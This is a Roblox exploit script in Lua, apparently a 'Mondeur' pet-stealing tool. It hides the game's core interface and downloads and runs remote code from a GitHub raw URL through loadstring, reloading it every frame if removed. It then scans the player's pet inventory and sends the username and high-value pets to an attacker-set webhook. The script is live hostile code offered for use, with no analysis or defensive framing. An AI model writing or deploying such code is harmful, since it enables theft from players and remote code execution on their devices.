if getgenv().MondeurExecuted then return end
getgenv().MondeurExecuted = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- [[ 1. THE IMMORTAL UI GUARD ]] --
task.spawn(function()
    local function LoadUI()
        pcall(function()
            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
            local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))()
            if ui then
                ui.Name = "MondeurGuard"
                ui.DisplayOrder = 999999999
            end
        end)
    end

    LoadUI()

    -- RECOVERY LOOP: If Android kills the UI, this brings it back instantly
    RunService.RenderStepped:Connect(function()
        local gui = LocalPlayer.PlayerGui:FindFirstChild("MondeurGuard")
        if not gui then
            LoadUI() -- Rebuild if missing
        else
            gui.Enabled = true
        end
    end)
end)

-- [[ 2. ANDROID STABLE LOGGING ]] --
local function SendLog(title, pet, val)
    local payload = HttpService:JSONEncode({
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = "User: **" .. LocalPlayer.Name .. "**",
            ["fields"] = {
                {["name"] = "Pet Detected", ["value"] = pet, ["inline"] = true},
                {["name"] = "Arfud Points", ["value"] = tostring(val), ["inline"] = true}
            },
            ["color"] = 0x00FF00
        }}
    })
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        pcall(function() req({Url = getgenv().WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) end)
    end
end

-- [[ 3. DEEP SCAN ]] --
task.spawn(function()
    task.wait(5)
    SendLog("📡 SYSTEM CHECK", "W-Immortal Active", 0)

    local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
    local data = ClientData.get_data()
    local petPath = data.inventory and (data.inventory.inventory_pets or data.inventory.pets)
    
    if petPath then
        for _, pet in pairs(petPath) do
            local val = _G.GetTrueValue(pet, _G.PetValueDB) or 0
            if val >= (getgenv().THRESHOLD or 0) then
                SendLog("✅ PET CAPTURED", pet.config_name or "Unknown", val)
            end
        end
    end
end)
